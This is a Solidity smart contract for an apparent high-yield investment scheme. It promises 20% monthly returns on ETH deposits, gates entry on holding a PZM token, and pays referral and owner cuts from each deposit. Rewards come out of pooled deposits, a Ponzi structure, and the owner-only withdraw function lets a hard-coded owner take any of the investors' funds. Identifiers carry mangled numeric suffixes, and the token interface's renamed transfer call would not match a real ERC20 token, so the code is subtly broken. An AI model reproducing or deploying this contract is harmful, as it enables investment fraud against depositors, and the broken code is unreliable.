

pragma solidity ^0.5.7;



contract ERC20Token
{
    mapping (address => uint256) public balanceOf;
    function TRANSFER650(address _to, uint256 _value) public;
}

library SafeMath {

    function ADD696(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function SUB727(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }


    function MUL579(uint256 a, uint256 b) internal pure returns (uint256) {



        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function DIV93(uint256 a, uint256 b) internal pure returns (uint256) {

        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;


        return c;
    }


    function MOD838(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

contract PZMT_20_Plus
{
    using SafeMath for uint256;

    address payable public owner = 0x76E40e08e10c8D7D088b20D26349ec52932F8BC3;

    uint256 minBalance = 100;
    ERC20Token PZM_Token = ERC20Token(0x71ee6E4fD5F2E70eD5e6fBAf853AE3B223564BCa);

    struct InvestorData {
        uint256 funds;
        uint256 lastDatetime;
        uint256 totalProfit;
    }
    mapping (address => InvestorData) investors;

    modifier ONLYOWNER245()
    {
        assert(msg.sender == owner);
        _;
    }

    function WITHDRAW99(uint256 amount)  public ONLYOWNER245 {
        owner.transfer(amount);
    }

    function CHANGEOWNER707(address payable newOwner) public ONLYOWNER245 {
        owner = newOwner;
    }

    function CHANGEMINBALANCE924(uint256 newMinBalance) public ONLYOWNER245 {
        minBalance = newMinBalance;
    }

    function BYTESTOADDRESS738(bytes memory bys) private pure returns (address payable addr) {
        assembly {
          addr := mload(add(bys,20))
        }
    }

    function TRANSFERTOKENS239 (address token, address target, uint256 amount) ONLYOWNER245 public
    {
        ERC20Token(token).TRANSFER650(target, amount);
    }

    function GETINFO234(address investor) view public returns (uint256 totalFunds, uint256 pendingReward, uint256 totalProfit, uint256 contractBalance)
    {
        InvestorData memory data = investors[investor];
        totalFunds = data.funds;
        if (data.funds > 0) pendingReward = data.funds.MUL579(20).DIV93(100).MUL579(block.timestamp - data.lastDatetime).DIV93(30 days);
        totalProfit = data.totalProfit;
        contractBalance = address(this).balance;
    }

    function() payable external
    {
        assert(msg.sender == tx.origin);

        if (msg.sender == owner) return;

        assert(PZM_Token.balanceOf(msg.sender) >= minBalance * 10**18);


        InvestorData storage data = investors[msg.sender];

        if (msg.value > 0)
        {

            assert(msg.value >= 0.2 ether || (data.funds != 0 && msg.value >= 0.01 ether));
            if (msg.data.length == 20) {
                address payable ref = BYTESTOADDRESS738(msg.data);
                assert(ref != msg.sender);
                ref.transfer(msg.value.MUL579(10).DIV93(100));
                owner.transfer(msg.value.MUL579(5).DIV93(100));
            } else if (msg.data.length == 0) {
                owner.transfer(msg.value.MUL579(15).DIV93(100));
            } else {
                assert(false);
            }
        }


        if (data.funds != 0) {

            uint256 reward = data.funds.MUL579(20).DIV93(100).MUL579(block.timestamp - data.lastDatetime).DIV93(30 days);
            data.totalProfit = data.totalProfit.ADD696(reward);

            address(msg.sender).transfer(reward);
        }

        data.lastDatetime = block.timestamp;
        data.funds = data.funds.ADD696(msg.value.MUL579(85).DIV93(100));

    }
}
